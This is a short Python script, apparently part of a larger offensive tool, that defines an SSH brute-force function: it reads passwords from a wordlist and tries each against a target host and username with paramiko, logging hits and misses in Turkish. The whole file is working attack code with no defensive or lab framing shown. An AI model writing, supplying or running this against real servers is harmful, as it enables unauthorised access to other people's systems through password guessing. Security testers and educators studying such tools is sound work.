import paramiko
from utils import log_success, log_fail

def ssh_bruteforce(host, username, wordlist_path):
    with open(wordlist_path, "r") as f:
        for password in f:
            password = password.strip()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=host, username=username, password=password, timeout=5)
                log_success(f"[+] Doğru parola bulundu: {password}")
                ssh.close()
                return
            except:
                log_fail(f"[-] Hatalı parola: {password}")
